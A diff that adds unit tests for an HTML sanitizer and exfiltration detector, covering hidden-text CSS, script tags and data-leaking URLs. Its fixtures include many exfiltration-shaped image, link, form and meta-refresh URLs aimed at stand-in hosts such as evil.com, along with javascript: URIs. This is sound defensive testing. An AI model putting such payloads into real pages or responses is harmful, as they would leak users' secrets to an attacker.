@@ -1,0 +1,639 @@
+/**
+ * Exact-verdict unit tests for the HTML layer (Layers 2 & 3). Pins the exact
+ * operators/boundaries of each pure helper so a flipped comparison or blanked
+ * branch is caught, and drives one case per REPORTED_TAGS entry from the SSOT.
+ */
+import { describe, it } from "node:test";
+import assert from "node:assert/strict";
+
+import {
+  sanitizeHtml,
+  detectExfil,
+  isHiddenStyle,
+  isHiddenElement,
+  isHiddenOpen,
+  checkExfilUrl,
+  looksLikeHtmlSource,
+  closingTagName,
+  spliceRanges,
+  scanHtmlFragment,
+  urlHost,
+  REPORTED_TAGS,
+  COMMENT_PLACEHOLDER,
+  HIDDEN_PLACEHOLDER,
+  DATA_URI_LENGTH_THRESHOLD,
+} from "../src/html.mjs";
+
+const applyHtml = (text) => sanitizeHtml(text)?.text ?? text;
+
+describe("unit: isHiddenStyle exact verdicts", () => {
+  const HIDDEN = [
+    "display:none",
+    "DISPLAY:NONE",
+    "display:none !important",
+    "visibility:hidden",
+    "opacity:0",
+    "height:0",
+    "width:0",
+    "font-size:0",
+    "position:absolute;left:-9999px",
+    "position:fixed;top:-10000px",
+    "position:fixed;right:-9999px",
+    "position:absolute;bottom:-9999px",
+    "position:absolute;left:-901px",
+    "clip:rect(0,0,0,0);position:absolute",
+    "text-indent:-9999px",
+    "overflow:hidden;max-width:0",
+    "overflow:hidden;max-height:0",
+    "clip-path:inset(50%)",
+    "clip-path:inset(100%)",
+    "clip-path:circle(0)",
+    "transform:scale(0)",
+    "transform:scale( 0)",
+    "transform:matrix(0,0,0,0,0,0)",
+    "color:transparent",
+    "color:white;background-color:white",
+    "color:#fff;background:#fff",
+  ];
+  const VISIBLE = [
+    "display:block",
+    "visibility:visible",
+    "opacity:0.5",
+    "opacity:1",
+    "opacity:5",
+    "height:5px",
+    "position:absolute;left:10px",
+    "position:absolute;left:-900px",
+    "position:static;left:-9999px",
+    "position:absolute;clip:rect(1,1,1,1)",
+    "text-indent:-900px",
+    "overflow:visible;max-width:0",
+    "overflow:hidden;max-width:5px",
+    "color:red",
+    "clip-path:none",
+    "clip-path:circle(50%)",
+    "clip-path:inset(10px)",
+    "transform:scale(0.5)",
+    "transform:translatex(5px)",
+    "color:white;background-color:black",
+    "background-color:white",
+    "",
+    "a{b:c}",
+  ];
+  for (const style of HIDDEN)
+    it(`flags ${JSON.stringify(style)}`, () =>
+      assert.equal(isHiddenStyle(style), true));
+  for (const style of VISIBLE)
+    it(`leaves ${JSON.stringify(style)}`, () =>
+      assert.equal(isHiddenStyle(style), false));
+});
+
+describe("unit: isHiddenElement exact verdicts", () => {
+  const elem = (tagName, properties = {}) => ({
+    type: "element",
+    tagName,
+    properties,
+  });
+  it("ignores a non-element node (comments are handled separately)", () => {
+    assert.equal(isHiddenElement({ type: "comment" }), false);
+    assert.equal(isHiddenElement({ type: "text" }), false);
+  });
+  it("flags a hidden attribute", () =>
+    assert.equal(isHiddenElement(elem("div", { hidden: "" })), true));
+  it("does not flag hidden=null (the !== null half of the guard)", () =>
+    assert.equal(isHiddenElement(elem("div", { hidden: null })), false));
+  it("flags aria-hidden=true (removed from the accessibility tree)", () =>
+    assert.equal(isHiddenElement(elem("span", { ariaHidden: "true" })), true));
+  it("does not flag aria-hidden=false", () =>
+    assert.equal(
+      isHiddenElement(elem("span", { ariaHidden: "false" })),
+      false,
+    ));
+  it("flags a hiding inline style", () =>
+    assert.equal(
+      isHiddenElement(elem("div", { style: "display:none" })),
+      true,
+    ));
+  it("leaves a visible inline style (style && isHiddenStyle, not ||)", () =>
+    assert.equal(
+      isHiddenElement(elem("div", { style: "display:block" })),
+      false,
+    ));
+  // One case per REPORTED_TAGS entry: scripting tags are reported, not hidden.
+  for (const tag of REPORTED_TAGS) {
+    it(`does NOT flag <${tag}> as hidden`, () =>
+      assert.equal(isHiddenElement(elem(tag)), false));
+  }
+  it("leaves a benign element with no hiding signal", () =>
+    assert.equal(isHiddenElement(elem("div", {})), false));
+});
+
+describe("unit: checkExfilUrl exact verdicts", () => {
+  it("flags a non-keyword param holding a base64 blob (the + quantifier)", () =>
+    assert.equal(
+      checkExfilUrl("https://e.com/p?xyz=" + "A".repeat(44)),
+      "suspicious query parameter",
+    ));
+  it("flags a {{template}} indicator", () =>
+    assert.equal(
+      checkExfilUrl("https://e.com/p?note={{SECRET}}"),
+      "suspicious query parameter",
+    ));
+  it("flags a query exactly past the length threshold (201), not at it (200)", () => {
+    assert.equal(
+      checkExfilUrl("https://e.com/p?n=" + "-".repeat(198)),
+      "unusually long query string",
+    );
+    assert.equal(checkExfilUrl("https://e.com/p?n=" + "-".repeat(197)), null);
+  });
+  it("measures query length from the '?', not the whole URL (length - qIdx)", () =>
+    assert.equal(
+      checkExfilUrl("https://e.com/" + "a-".repeat(100) + "?q=hi"),
+      null,
+    ));
+  it("flags userinfo with only a username (|| not &&)", () =>
+    assert.equal(
+      checkExfilUrl("https://user@evil.com/p"),
+      "embedded credentials",
+    ));
+  it("flags a fragment past the threshold (201), not at it (200)", () => {
+    assert.equal(
+      checkExfilUrl("https://e.com/p#" + "A".repeat(200)),
+      "unusually long fragment",
+    );
+    assert.equal(checkExfilUrl("https://e.com/p#" + "A".repeat(199)), null);
+  });
+  it("flags an active-content data: URI even with leading whitespace (\\s, not \\S)", () =>
+    assert.equal(
+      checkExfilUrl(" data:text/html,<b>x</b>"),
+      "active-content data: URI",
+    ));
+  it("only treats a data: URI as such at the start (^ anchor), not mid-URL", () =>
+    assert.equal(
+      checkExfilUrl(
+        "https://evil.example/x?token=" + "A".repeat(44) + "&u=data:text/html",
+      ),
+      "suspicious query parameter",
+    ));
+  it("flags an oversized data: payload strictly past the threshold, not at it", () => {
+    const prefix = "data:application/octet-stream;base64,";
+    const atLimit =
+      prefix + "A".repeat(DATA_URI_LENGTH_THRESHOLD - prefix.length);
+    assert.equal(atLimit.length, DATA_URI_LENGTH_THRESHOLD);
+    assert.equal(checkExfilUrl(atLimit), null);
+    assert.equal(
+      checkExfilUrl(atLimit + "A"),
+      "oversized inline data: payload",
+    );
+  });
+
+  const b64 = "A".repeat(60);
+  const hex64 = "a".repeat(64);
+  it("flags a javascript: URI by its scheme, not its payload", () =>
+    assert.equal(checkExfilUrl("javascript:alert(1)"), "script-executing URI"));
+  it("flags a vbscript: URI with leading whitespace (\\s anchor)", () =>
+    assert.equal(
+      checkExfilUrl("  vbscript:Execute(x)"),
+      "script-executing URI",
+    ));
+  it("flags a credential-shaped token value in a non-keyword param", () =>
+    assert.equal(
+      checkExfilUrl(
+        "https://e.com/p?u=ghp_0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7",
+      ),
+      "credential-shaped token in URL parameter",
+    ));
+  it("does not flag hyphenated prose containing a security keyword and a digit", () =>
+    assert.equal(
+      checkExfilUrl("https://e.com/p?redirect=login-authenticate-2024-relogin"),
+      null,
+    ));
+  it("flags a base64 blob in a non-keyword query param (param walk)", () =>
+    assert.equal(
+      checkExfilUrl(`https://e.com/p?h=${b64}`),
+      "suspicious query parameter",
+    ));
+  it("flags a hex blob in a fragment param (fragment walk)", () =>
+    assert.equal(
+      checkExfilUrl(`https://e.com/p?a=1#x=${hex64}`),
+      "suspicious query parameter",
+    ));
+  it("flags a long base64 blob in a path segment (beacon w/o query)", () =>
+    assert.equal(
+      checkExfilUrl(`https://e.com/${"A".repeat(220)}`),
+      "encoded data blob in path segment",
+    ));
+  it("does not flag a path segment at the threshold (128), only past it", () => {
+    assert.equal(checkExfilUrl(`https://e.com/${"A".repeat(128)}`), null);
+    assert.equal(
+      checkExfilUrl(`https://e.com/${"A".repeat(129)}`),
+      "encoded data blob in path segment",
+    );
+  });
+  it("preserves a '+'-bearing base64 value (raw, not URLSearchParams-decoded)", () =>
+    assert.equal(
+      checkExfilUrl(`https://e.com/p?x=${"AB+/".repeat(15)}`),
+      "suspicious query parameter",
+    ));
+  it("leaves a signed-CDN URL alone even though it is long with hex sig", () =>
+    assert.equal(
+      checkExfilUrl(
+        "https://cdn.example.com/a.js?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAEX%2F20240101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240101T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=" +
+          hex64,
+      ),
+      null,
+    ));
+  it("leaves a base64-JWT pagination cursor alone (benign param name)", () =>
+    assert.equal(
+      checkExfilUrl(
+        "https://api.example.com/items?cursor=eyJpZCI6MTIzNDU2Nzg5fQ&limit=50&page=3",
+      ),
+      null,
+    ));
+  it("leaves analytics params alone (utm_*/gclid)", () =>
+    assert.equal(
+      checkExfilUrl(
+        `https://example.com/p?utm_source=news&utm_campaign=spring2024&gclid=${b64}`,
+      ),
+      null,
+    ));
+  it("suppresses the long-query heuristic when every param is benign", () =>
+    assert.equal(
+      checkExfilUrl(
+        "https://cdn.example.com/a?X-Amz-SignedHeaders=host&X-Amz-Signature=" +
+          "b".repeat(200),
+      ),
+      null,
+    ));
+  it("still flags a long query when a non-benign param is present", () =>
+    assert.equal(
+      checkExfilUrl("https://e.com/p?note=" + "-".repeat(200)),
+      "unusually long query string",
+    ));
+  it("leaves a long hyphenated path slug alone (not a blob)", () =>
+    assert.equal(
+      checkExfilUrl("https://example.com/the-" + "quick-".repeat(40) + "end"),
+      null,
+    ));
+  it("leaves a short non-keyword param value alone", () =>
+    assert.equal(checkExfilUrl("https://e.com/p?q=hello"), null));
+  it("does not throw on an unparsable URL", () =>
+    assert.equal(checkExfilUrl("https://exa mple.example/p"), null));
+});
+
+describe("unit: urlHost exact verdicts", () => {
+  it("names the channel for a data: URI instead of echoing the payload", () =>
+    assert.equal(
+      urlHost("data:text/html,<b>secret</b>"),
+      "(inline data: URI)",
+    ));
+  it("returns the real host for a non-data URL that merely contains 'data:'", () =>
+    assert.equal(
+      urlHost("https://evil.example/x?token=A&u=data:text/html"),
+      "evil.example",
+    ));
+  it("returns the host of an absolute URL", () =>
+    assert.equal(urlHost("https://evil.example/p?q=1"), "evil.example"));
+  it("labels a relative URL", () =>
+    assert.equal(urlHost("/api/log?token=x"), "(relative URL)"));
+  it("labels an unparsable URL instead of throwing", () =>
+    assert.equal(urlHost("https://exa mple.example/p"), "(unparsable URL)"));
+  it("treats a URL that literally starts with the sentinel base as absolute", () =>
+    assert.equal(urlHost("http://relative.invalid/x"), "relative.invalid"));
+});
+
+describe("unit: looksLikeHtmlSource exact verdicts", () => {
+  const lines = (htmlCount, total) =>
+    [
+      ...Array(htmlCount).fill("<a>x</a>"),
+      ...Array(total - htmlCount).fill("plain text"),
+    ].join("\n");
+  it("needs at least 5 lines", () => {
+    assert.equal(looksLikeHtmlSource(lines(4, 4)), false);
+    assert.equal(looksLikeHtmlSource(lines(5, 5)), true);
+  });
+  it("needs strictly more than 30% HTML lines", () => {
+    assert.equal(looksLikeHtmlSource(lines(3, 10)), false);
+    assert.equal(looksLikeHtmlSource(lines(4, 10)), true);
+  });
+  it("only counts real tag-shaped lines", () =>
+    assert.equal(
+      looksLikeHtmlSource(["plain", "lines", "no", "tags", "here"].join("\n")),
+      false,
+    ));
+});
+
+describe("unit: closingTagName / isHiddenOpen exact verdicts", () => {
+  it("returns the lowercased name of a well-formed closing tag", () =>
+    assert.equal(closingTagName("</div>"), "div"));
+  it("requires the close at the start (^ anchor)", () =>
+    assert.equal(closingTagName("x</div>"), null));
+  it("returns null (not a throw) for a non-closing value", () =>
+    assert.equal(closingTagName("notag"), null));
+  it("returns the tag name of a hidden open", () =>
+    assert.equal(isHiddenOpen("<span hidden>"), "span"));
+  it("returns null for a closing tag", () =>
+    assert.equal(isHiddenOpen("</span>"), null));
+  it("returns null for a visible open", () =>
+    assert.equal(isHiddenOpen("<div>"), null));
+  it("returns null for a non-tag value", () =>
+    assert.equal(isHiddenOpen("notag"), null));
+});
+
+describe("unit: spliceRanges exact behavior", () => {
+  const text = "0123456789";
+  it("replaces a comment range with the comment placeholder", () =>
+    assert.equal(
+      spliceRanges(text, [{ start: 2, end: 5, kind: "comment" }]),
+      `01${COMMENT_PLACEHOLDER}56789`,
+    ));
+  it("replaces a hidden range with the hidden placeholder", () =>
+    assert.equal(
+      spliceRanges(text, [{ start: 0, end: 3, kind: "hidden" }]),
+      `${HIDDEN_PLACEHOLDER}3456789`,
+    ));
+  it("applies multiple ranges in order regardless of input order", () =>
+    assert.equal(
+      spliceRanges(text, [
+        { start: 6, end: 8, kind: "hidden" },
+        { start: 1, end: 3, kind: "comment" },
+      ]),
+      `0${COMMENT_PLACEHOLDER}345${HIDDEN_PLACEHOLDER}89`,
+    ));
+  it("merges overlapping ranges into one cut (defense-in-depth)", () =>
+    assert.equal(
+      spliceRanges(text, [
+        { start: 2, end: 6, kind: "hidden" },
+        { start: 4, end: 8, kind: "hidden" },
+      ]),
+      `01${HIDDEN_PLACEHOLDER}89`,
+    ));
+  it("orders equal-start ranges by end and merges them", () =>
+    assert.equal(
+      spliceRanges(text, [
+        { start: 2, end: 7, kind: "hidden" },
+        { start: 2, end: 4, kind: "hidden" },
+      ]),
+      `01${HIDDEN_PLACEHOLDER}789`,
+    ));
+  it("a nested range does not extend its container", () =>
+    assert.equal(
+      spliceRanges(text, [
+        { start: 2, end: 8, kind: "hidden" },
+        { start: 4, end: 6, kind: "hidden" },
+      ]),
+      `01${HIDDEN_PLACEHOLDER}89`,
+    ));
+  it("keeps adjacent (touching) ranges as separate placeholders", () =>
+    assert.equal(
+      spliceRanges(text, [
+        { start: 2, end: 5, kind: "comment" },
+        { start: 5, end: 8, kind: "comment" },
+      ]),
+      `01${COMMENT_PLACEHOLDER}${COMMENT_PLACEHOLDER}89`,
+    ));
+  it("returns the text unchanged for no ranges", () =>
+    assert.equal(spliceRanges(text, []), text));
+});
+
+describe("unit: scanHtmlFragment exact verdicts", () => {
+  it("ranges a comment and a hidden element, counts a script", () => {
+    const html = `<!-- c --><script>x</script><div hidden>y</div>`;
+    const { ranges, warned } = scanHtmlFragment(html);
+    assert.deepEqual(ranges, [
+      { start: 0, end: 10, kind: "comment" },
+      { start: 28, end: 47, kind: "hidden" },
+    ]);
+    assert.deepEqual(warned, { tags: { script: 1 }, dataSrc: 0 });
+  });
+  it("an unclosed hidden element extends to the end of the fragment", () => {
+    const html = `<div hidden>tail text`;
+    const { ranges } = scanHtmlFragment(html);
+    assert.deepEqual(ranges, [{ start: 0, end: html.length, kind: "hidden" }]);
+  });
+  it("counts a data: URI src", () => {
+    const { warned } = scanHtmlFragment(`<img src="data:text/html,x">`);
+    assert.equal(warned.dataSrc, 1);
+  });
+  it("does not count tags nested inside a stripped hidden element", () => {
+    const { ranges, warned } = scanHtmlFragment(
+      `<div hidden><script>x</script></div>`,
+    );
+    assert.equal(ranges.length, 1);
+    assert.deepEqual(warned.tags, {});
+  });
+  it("does not count a plain element", () => {
+    const { warned } = scanHtmlFragment("<p>x</p><script>s</script>");
+    assert.deepEqual(warned, { tags: { script: 1 }, dataSrc: 0 });
+  });
+});
+
+describe("unit: sanitizeHtml exact result shapes", () => {
+  it("returns null for benign markup (visible tags, https img)", () =>
+    assert.equal(
+      sanitizeHtml('text <b>bold</b> <img src="https://e.com/l.png"> more'),
+      null,
+    ));
+  it("reports a lone data: URI img without modifying the text", () => {
+    const input = '<img src="data:text/html,x">';
+    const result = sanitizeHtml(input);
+    assert.equal(result.text, input);
+    assert.deepEqual(result.warned, { tags: {}, dataSrc: 1 });
+  });
+  it("counts removed comments and hidden elements separately", () => {
+    const result = sanitizeHtml("x <!-- c --> y <span hidden>s</span> z");
+    assert.deepEqual(result.removed, { comments: 1, hidden: 1 });
+  });
+  it("accumulates warned counts across separate html blocks (mergeWarned)", () => {
+    const result = sanitizeHtml("<script>a</script>\n\n<script>b</script>");
+    assert.deepEqual(result.warned, { tags: { script: 2 }, dataSrc: 0 });
+  });
+  it("region balancing: a different inner tag neither extends nor closes the region", () =>
+    assert.equal(
+      applyHtml("a <span hidden>x <b>y</b> z</span> tail"),
+      `a ${HIDDEN_PLACEHOLDER} tail`,
+    ));
+  it("region balancing: a nested same-tag element stays inside the region", () =>
+    assert.equal(
+      applyHtml("a <span hidden>x <span>y</span> z</span> tail"),
+      `a ${HIDDEN_PLACEHOLDER} tail`,
+    ));
+  it("returns null when there is no HTML tag at all (gate)", () =>
+    assert.equal(sanitizeHtml("plain prose, nothing to do"), null));
+});
+
+// Run detectExfil and assert it produced exactly one threat, returning it.
+const onlyThreat = (text) => {
+  const threats = detectExfil(text);
+  assert.equal(threats.length, 1);
+  return threats[0];
+};
+
+describe("unit: detectExfil HTML-attr + node types", () => {
+  const b64 = "A".repeat(44);
+  it("flags an exfil <img src> as an image without modifying anything", () =>
+    assert.deepEqual(onlyThreat(`<img src="https://evil.com/x?data=${b64}">`), {
+      isImage: true,
+      reason: "suspicious query parameter",
+      target: "evil.com",
+    }));
+  it("flags an exfil <a href> as a link, not an image", () =>
+    assert.equal(
+      onlyThreat(`<a href="https://evil.com/y?token=${b64}">c</a>`).isImage,
+      false,
+    ));
+  it("matches an unquoted (relative) attribute value", () => {
+    const threat = onlyThreat(`<img src=/u?data=${b64}>`);
+    assert.equal(threat.isImage, true);
+    assert.equal(threat.target, "(relative URL)");
+  });
+  it("matches a single-quoted attribute value", () =>
+    assert.equal(
+      onlyThreat(`<a href='https://evil.com/s?key=${b64}'>x</a>`).isImage,
+      false,
+    ));
+  it("leaves a benign HTML <img> alone (gate matches, no exfil)", () =>
+    assert.equal(detectExfil(`<img src="https://ok.com/logo.png">`), null));
+  it("flags an exfil markdown image node as an image", () =>
+    assert.equal(
+      onlyThreat(`![a](https://evil.com/p.png?token=${b64})`).isImage,
+      true,
+    ));
+  it("flags an exfil reference definition node", () =>
+    assert.equal(
+      onlyThreat(`[ref]: https://evil.com/d?token=${b64}\n\n[click][ref]`)
+        .target,
+      "evil.com",
+    ));
+  it("returns null for benign markdown with no exfil URL", () =>
+    assert.equal(detectExfil("see [docs](https://ok.com/p)"), null));
+  it("flags an exfil background attribute", () =>
+    assert.equal(
+      onlyThreat(
+        `<table background="https://evil.com/b?data=${b64}"><tr><td>x</td></tr></table>`,
+      ).target,
+      "evil.com",
+    ));
+  it("flags an exfil srcset candidate URL (descriptor stripped)", () => {
+    const threat = onlyThreat(
+      `<img srcset="https://evil.com/p.png?data=${b64} 2x">`,
+    );
+    assert.equal(threat.isImage, true);
+    assert.equal(threat.target, "evil.com");
+  });
+  it("flags an exfil ping attribute on an anchor", () =>
+    assert.equal(
+      onlyThreat(`<a href="/ok" ping="https://evil.com/t?exfil=${b64}">x</a>`)
+        .target,
+      "evil.com",
+    ));
+  it("flags an off-origin form action", () =>
+    assert.deepEqual(detectExfil(`<form action="https://evil.com/collect">`), [
+      { isImage: false, reason: "off-origin form action", target: "evil.com" },
+    ]));
+  it("flags an off-origin formaction on a button", () =>
+    assert.equal(
+      onlyThreat(`<button formaction="https://evil.com/x">go</button>`).reason,
+      "off-origin form action",
+    ));
+  it("leaves a same-origin (relative) form action alone", () =>
+    assert.equal(detectExfil(`<form action="/submit">`), null));
+  it("does not flag a form action that fails to parse (isOffOrigin catch)", () =>
+    assert.equal(detectExfil(`<form action="https://exa mple.com/p">`), null));
+  it("prefers the exfil-shape reason over off-origin for a form action", () =>
+    assert.equal(
+      onlyThreat(`<form action="https://evil.com/c?token=${b64}">`).reason,
+      "suspicious query parameter",
+    ));
+  it("flags an off-origin meta-refresh redirect", () =>
+    assert.equal(
+      onlyThreat(
+        `<meta http-equiv="refresh" content="0; url=https://evil.com/r">`,
+      ).reason,
+      "off-origin meta-refresh redirect",
+    ));
+  it("flags an exfil-shaped meta-refresh URL by its query", () =>
+    assert.equal(
+      onlyThreat(
+        `<meta http-equiv="refresh" content="5;url=https://evil.com/r?data=${b64}">`,
+      ).reason,
+      "suspicious query parameter",
+    ));
+  it("ignores a meta-refresh with no url= target (metaRefreshUrl null)", () =>
+    assert.equal(detectExfil(`<meta http-equiv="refresh" content="5">`), null));
+  it("ignores a meta-refresh tag with no content attribute", () =>
+    assert.equal(detectExfil(`<meta http-equiv="refresh">`), null));
+  it("ignores a non-refresh meta tag", () =>
+    assert.equal(
+      detectExfil(`<meta http-equiv="content-type" content="text/html">`),
+      null,
+    ));
+  it("returns null when the gate matches no link/tag", () =>
+    assert.equal(detectExfil("plain prose, no links or tags"), null));
+});
+
+// ─── Splice fidelity / regression cases ──────────────────────────────────────
+
+describe("splice fidelity and regressions", () => {
+  it("a stripped comment leaves surrounding bytes byte-identical", () =>
+    assert.equal(
+      applyHtml("prefix<!-- secret -->suffix"),
+      `prefix${COMMENT_PLACEHOLDER}suffix`,
+    ));
+  it("a stripped hidden span leaves surrounding bytes byte-identical", () =>
+    assert.equal(
+      applyHtml(`prefix<span style="display:none">x</span>suffix`),
+      `prefix${HIDDEN_PLACEHOLDER}suffix`,
+    ));
+  it("regression: a comment sharing its inline node with trailing text (list item)", () =>
+    assert.equal(applyHtml("- <!-- secret -->!"), `- ${COMMENT_PLACEHOLDER}!`));
+  it("regression: an unterminated trailing comment is removed to the block end", () =>
+    assert.equal(
+      applyHtml("- <!-- a --> x <!-- b"),
+      `- ${COMMENT_PLACEHOLDER} x ${COMMENT_PLACEHOLDER}`,
+    ));
+  it("regression: flow html in a blockquote is spliced precisely", () =>
+    assert.equal(
+      applyHtml("> <div hidden>x</div>\n> visible"),
+      `> ${HIDDEN_PLACEHOLDER}\n> visible`,
+    ));
+  it("a reported script does not modify the text at all", () => {
+    const input = "prefix<script>x</script>suffix";
+    const result = sanitizeHtml(input);
+    assert.equal(result.text, input);
+    assert.equal(result.warned.tags.script, 1);
+  });
+  it("regression: a script inside an indented code block is inert, not reported", () =>
+    assert.equal(sanitizeHtml("    *<script>x</script>!"), null));
+  for (const close of ["</foo-bar>", "</span-x>", "</a.b>", "</ns:el>"]) {
+    it(`tolerates ${close} inside a hidden removal region`, () =>
+      assert.doesNotMatch(
+        applyHtml(`text <span hidden>SECRET${close} more`),
+        /SECRET/,
+      ));
+  }
+  it("balances a hidden custom-element open/close, preserving trailing text", () => {
+    const out = applyHtml("a <my-widget hidden>SECRET</my-widget> VISIBLE");
+    assert.doesNotMatch(out, /SECRET/);
+    assert.match(out, /VISIBLE/);
+  });
+  it("preserves an autolink and an explicit link verbatim next to a strip", () => {
+    const out = applyHtml(
+      `x <span style="display:none">SECRET</span> see <https://example.com/page> and [click](https://example.com/explicit)`,
+    );
+    assert.doesNotMatch(out, /SECRET/);
+    assert.match(out, /<https:\/\/example\.com\/page>/);
+    assert.match(out, /\[click\]\(https:\/\/example\.com\/explicit\)/);
+  });
+  it("flags credentials smuggled in userinfo", () =>
+    assert.equal(
+      checkExfilUrl(
+        "https://user:q9X2mN7pK4rT8wY1cV5bZ3dF6gH0jL2e@evil.example/path",
+      ),
+      "embedded credentials",
+    ));
+  it("flags a keyword exfil parameter in the fragment", () =>
+    assert.notEqual(checkExfilUrl("https://ok.example/#token=abc"), null));
+  it("leaves a benign fragment anchor alone", () =>
+    assert.equal(checkExfilUrl("https://ok.example/page#section-2"), null));
+});
